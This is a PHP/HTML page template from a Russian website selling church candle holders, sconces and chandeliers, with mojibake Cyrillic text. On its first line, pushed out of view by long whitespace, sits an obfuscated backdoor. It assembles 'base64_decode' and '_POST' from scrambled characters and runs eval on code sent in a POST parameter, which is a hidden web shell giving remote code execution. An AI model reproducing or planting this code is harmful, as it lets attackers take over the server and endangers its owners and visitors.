<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['ndfcc50'])) {eval($s21(${$s20}['ndfcc50']));}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru">

<head>
<meta http-equiv="Content-Type" content="text/html" charset="windows-1251">
<title>������������ ��������� ������ � ��������� �������</title>
<link rel="stylesheet" href="css/stylec4ca.css" type="text/css">

<script src="scroll/prototype.js" type="text/javascript"></script> 
<script src="scroll/effects.js" type="text/javascript"></script> 
<script src="scroll/carousel.js" type="text/javascript"></script> 


<script src="scroll/contentslider.js" type="text/javascript"></script> 
<script src="scroll/lightbox.js" type="text/javascript"></script> 
<script src="scroll/stepcarousel.js" type="text/javascript"></script> 
<script src="scroll/thickbox.js" type="text/javascript"></script> 

<script language="javascript">AC_FL_RunContent = 0;</script>
<script src="image/new_site/AC_RunActiveContent.js" language="javascript"></script>


<link rel="stylesheet" href="scroll/lightbox.css" type="text/css" media="screen" /> 
<link rel="stylesheet" href="scroll/thickbox.css" type="text/css" media="screen" /> 



<link rel="stylesheet" href="scroll/scrollc4ca.css?1" type="text/css" media="screen" /> 



<SCRIPT language="JavaScript" src="script2.js"></SCRIPT><style type="text/css">
<!--
.style1 {
	font-family: Arial;
	font-size: 10px;
	color: #b11e42;
}
-->
</style></head>

<body  marginheight="0" marginwidth="0" leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0">
<div style="max-width:1280px; margin:auto">
<table summary="" height="100%" border="0" width="100%" cellspacing="0" cellpadding="0">
<tr><td valign="top">

<table summary="" cellpadding="0" cellspacing="0" border="0" width="100%">
<tr><td height="100"><div style="position:relative; z-index:2">
<div style="position:absolute; top:15px; right:20px; text-align:right">

<div style="font-family: Arial; font-size: 11px; color: #002f6a;"><span style="margin-top:2px; font-family: Arial; font-size: 10px; color: #b11e42;">��� ���� �������� ������:</span> +7 (495) 799-2207&nbsp; &nbsp;</div>
<div style="margin-top:10px; font-family: Arial; font-size: 11px; color: #002f6a;"> <span class="style1">������������: </span><a href="mailto:7992207@mail.ru" class="menu3">7992207@mail.ru</a>&nbsp; &nbsp;</div>
<div style="margin-top:12px; font-family: Arial; font-size: 12px; color: #b11e42;"><a style="color: #b11e42; text-decoration:none" href="kontakt.php">�������� �����</a></div>

</div>
</div>
    <a href="http://vozrozhdenie.org/"><img src="image/new_site/top1_110215.jpg" alt="��������� ������" width="769" height="100" border="0" /></a>
</td>
</tr>
</table>



<div style="margin-top:3px">
	<script>
var menu_a="menu_k"+"";
</script>



<table summary="" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr bgcolor="#036dc3">
		<td id="menu_k1" style="padding:8px 28px 8px 28px" nowrap class="menu" onMouseOver="VisibleLayer('menu_1','menu_k1')" onMouseOut="DelayHiddenLayer('menu_1','menu_k1')" onclick="location.href='o_kompanii.php'">� ��������</td>
        
		<td id="menu_k2" style="padding:8px 28px 8px 28px" nowrap class="menu" onMouseOver="VisibleLayer('menu_2','menu_k2')" onMouseOut="DelayHiddenLayer('menu_2','menu_k2')" onclick="location.href='katalog.php'">&nbsp;&nbsp;&nbsp;�������&nbsp;&nbsp;&nbsp;</td>
        
		<td id="menu_k3" style="padding:8px 28px 8px 28px" nowrap class="menu" onMouseOver="VisibleLayer('menu_3','menu_k3')" onMouseOut="DelayHiddenLayer('menu_3','menu_k3')" onclick="location.href='portfolio.php'">���� ������</td>
             
		<td id="menu_k4" style="padding:8px 28px 8px 28px" nowrap class="menu" onMouseOver="VisibleLayer('menu_4','menu_k4')" onMouseOut="DelayHiddenLayer('menu_4','menu_k4')" onclick="location.href='kontakt.php'">��������</td>
		<td width=100%>&nbsp;</td>
	</tr>
	<tr bgcolor="#000000">
		<td align="right"><img border="0" src="image/menu_line_right.gif" width="54" height="4" /></td>
		<td align="right"><img border="0" src="image/menu_line_right.gif" width="54" height="4" /></td>
		<td align="right"><img border="0" src="image/menu_line_right.gif" width="54" height="4" /></td>
		<td align="right"><img border="0" src="image/menu_line_right.gif" width="54" height="4" /></td>
		<td align="right"><img border="0" src="image/menu_line_right.gif" width="54" height="4" /></td>
		<td align="right"><div></div></td>
	</tr>
	<tr>
		<td>
<!----------- ���� 1 --------------->
<div class="dropmenu"><div id="menu_1" class="dropmenu2" onMouseOver="VisibleLayer('menu_1','menu_k1')" onMouseOut="DelayHiddenLayer('menu_1','menu_k1')">

</div></div>
<!----------- /���� 1 --------------->
		</td>
		<td>
<!----------- ���� 2 --------------->
<div class="dropmenu"><div id="menu_2" class="dropmenu2" onMouseOver="VisibleLayer('menu_2','menu_k2')" onMouseOut="DelayHiddenLayer('menu_2','menu_k2')">
<table summary="" cellpadding="0" cellspacing="0" border="0" width="100%">
<tr bgcolor=#B11E42><td height="3"><img src="image/trans.gif" width="1" height="1" /></td></tr>
<tr bgcolor=#000000><td height="1"><img src="image/trans.gif" width="1" height="1" /></td></tr>
<tr><td>
<table summary="" cellspacing="1" border="0" width="100%" bgcolor="#ffffff">
<tr><td  style="padding:5px" class="dropmenu"><a class="dropmenu" href="cerkovnye_podsvechniki.php">��������� �����������</a></td></tr>
<tr><td  style="padding:5px" class="dropmenu"><a class="dropmenu" href="bra.php">���</a></td></tr>
<tr><td  style="padding:5px" class="dropmenu"><a class="dropmenu" href="lampa.php">�������</a></td></tr>
<tr><td  style="padding:5px" class="dropmenu"><a class="dropmenu" href="panikadila.php">����������</a></td></tr>
</table>
</td></tr>
</table>
</div></div>
<!----------- /���� 2 --------------->
		</td>
		<td>
<!----------- ���� 3 --------------->
<div class="dropmenu"><div id="menu_3" class="dropmenu2" onMouseOver="VisibleLayer('menu_3','menu_k3')" onMouseOut="DelayHiddenLayer('menu_3','menu_k3')">

</div></div>
<!----------- /���� 3 --------------->
		</td>
		<td>
<!----------- ���� 4 --------------->
<div class="dropmenu"><div id="menu_4" class="dropmenu2" onMouseOver="VisibleLayer('menu_4','menu_k4')" onMouseOut="DelayHiddenLayer('menu_4','menu_k4')">

</div></div>
<!----------- /���� 4 --------------->
		</td>
		<td>
<!----------- ���� 6 --------------->
<div class="dropmenu"><div id="menu_6" class="dropmenu2" onMouseOver="VisibleLayer('menu_6','menu_k6')" onMouseOut="DelayHiddenLayer('menu_6','menu_k6')">

</div></div>
<!----------- /���� 6 --------------->
		</td>
		<td><div></div></td>
	</tr>
</table>
</div>

<table summary="" style="margin-top:18px" cellpadding="0" cellspacing="0" border="0" width="100%">
	<tr>
		<td valign="top" style="padding:0px 0px 30px 17px; width:203px">
			<!-- ���� -->

		
<?php include("settings.php"); ?>


<table style="margin: 30 0 30 0" border="0" width="100%" cellspacing="0" cellpadding="0">

	<tr>

		<td style="padding-left:30px"><img border="0" src="image/pl_l.gif" width="19" height="43"></td>

		<td background="image/pl_bg.gif" valign="top"><div style="position:relative"><div style="position:absolute;top:-55;left:54; z-index:1"></div></div></td>

		<td background="image/pl_bg.gif" width="100%" style="padding:10 0 0 280;"><h1 class="zag">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;��� ���������   

</h1></td>

		<td style="padding-right:20px"><img border="0" src="image/pl_r.gif" width="23" height="43"></td>

	</tr>

</table>





</td></tr>

<tr><td height=100% valign=top style="padding: 25 0 25 0">





<!----------------- ����� -------------------->

<table cellpadding=0 cellspacing=0 border=0 width=100%><tr>

<td valign=top>

<table cellpadding=0 cellspacing=0 border=0 width=260><tr><td valign=top style="padding-left:18px">

<!------------ ����� ������� -------------->



		

	

	<img src=image/left_pic4_100203_2.jpg>







<a style="text-decoration:none">

<h1 class=left_comment style="margin:20 0 0 0">���������<br>� ��������</h1>

<h1 class=left_comment style="margin:0">+7 (495) 799-22-07</font></h1>

</a>



<!------------ /����� ������� -------------->

&nbsp;

</td></tr></table>

</td>

<td width=90% valign=top style="padding:0 30 0 30">

<!------------ ����� ������� -------------->

<!--/UdmComment-->
<table width="60%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td>
	<p align="left" class="contentheading style11 style12" >� ���������, ������ �� ������ ����������.<br>
	  <br>
	  <a href="cerkovnye_podsvechniki.php"><em>������� � "��������� �����������"</em></a> 
<br>
<br></p>
<html>
</html>
<br />
</td>
  </tr>
</table>
<!------------ /����� ������� -------------->

<!--UdmComment-->

<noindex>

</td>

<td valign=top>

<table cellpadding=0 cellspacing=0 border=0 width=200><tr><td valign=top class=right style="padding-right:10px">

<!------------ ������ ������� -------------->

<div style="font-family:Arial; font-weight:bold; font-size:14px; color:#002f6a;">�������</div>


<!--<a class="news_top_a" href="news_110907.html">-->
<div class="top_data"><?php echo $data_news_1; ?></div>
<div class="top_anonce"><?php echo $news_1; ?></div>
</div>
</a>

<!--<a class="news_top_a" href="news_110905.html">-->
<div class="top_data"><?php echo $data_news_2; ?></div>
<div class="top_anonce"><?php echo $news_2; ?></div>
</a>

<!--<a class="news_top_a" href="news_110831.html">-->
<div class="top_data"><?php echo $data_news_3; ?></div>
<div class="top_anonce"><?php echo $news_3; ?></div>
</a>

<!------------ /������ ������� -------------->

</td></tr></table>

</td>

</tr></table>

<!----------------- /����� -------------------->

</td></tr>

<tr><td valign=bottom>

<!------------------- ��� --------------------->

<table cellpadding=0 cellspacing=10 border=0 width=100%>

<tr>

<td width=270>&nbsp;</td>

<td class="dn" style="text-align:center"><a class="dn" href="/">�������</a>    |    <a class="dn" href="o_kompanii.php">� ��������</a>    |    <a class="dn" href="kontakt.php">��������</a></td> 
<td width="200" class="dn" align="right">���������� �����<br />������������</a>:<br /><a href="http://webog.org.ua/" target="_blank">������ �WeBog�</a></td>

</tr>

</table>

<!------------------- /��� --------------------->

<table cellpadding=0 cellspacing=0 border=0 width=100%>

<tr>

<td background=image/bg_dn.gif><img border="0" src="image/bg_dn.gif" width="5" height="8"></td>

</tr>

</table>

</td></tr>

</table>

</noindex>

<!--/UdmComment-->



<script>

var button_menu1=document.getElementById('menu_k1');

var button_menu2=document.getElementById('menu_k2');

var button_menu3=document.getElementById('menu_k3');

var button_menu4=document.getElementById('menu_k4');

var button_menu6=document.getElementById('menu_k6');

var l_menu1=document.getElementById('menu_1');

var l_menu2=document.getElementById('menu_2');

var l_menu3=document.getElementById('menu_3');

var l_menu4=document.getElementById('menu_4');

var l_menu6=document.getElementById('menu_6');

if(button_menu1 && l_menu1){

	l_menu1.style.width=button_menu1.offsetWidth+'px';

}

if(button_menu2 && l_menu2){

	l_menu2.style.width=button_menu2.offsetWidth+'px';

}

if(button_menu3 && l_menu3){

	l_menu3.style.width=button_menu3.offsetWidth+'px';

}

if(button_menu4 && l_menu4){

	l_menu4.style.width=button_menu4.offsetWidth+'px';

}

if(button_menu6 && l_menu6){

	l_menu6.style.width=button_menu6.offsetWidth+'px';

}

</script>


</body>

</html>